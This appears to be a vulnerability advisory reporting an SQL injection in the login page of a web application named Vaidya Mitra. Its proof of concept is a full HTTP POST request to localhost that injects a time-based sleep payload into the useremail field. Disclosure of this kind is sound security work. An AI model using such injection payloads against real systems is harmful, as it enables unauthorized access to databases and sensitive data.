## Vulnerability Description:

A security vulnerability has been identified in this web application due to the direct inclusion of user-input data into SQL queries, rendering it susceptible to SQL Injection attacks. This vulnerability may enable malicious actors to gain unauthorized access to sensitive information.

## Proof of Concept (PoC):

Below is an example of an attack that a malicious actor could execute to exploit this vulnerability.

POST /Vaidya%20Mitra/vm/login.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://localhost
Connection: close
Referer: http://localhost/Vaidya%20Mitra/vm/login.php
Cookie: _ga=GA1.1.2080672900.1708952048; _gid=GA1.1.1833914840.1708952048; PHPSESSID=18a16tga7k2glh7

useremail=test@123.asd'%2b(select*from(select(sleep(5)))a)%2b'&userpassword=test

In this example, the payload appended to the useremail parameter aims to execute a sleep function, intentionally delaying the server's response time. Real-world attacks could involve more malicious operations.
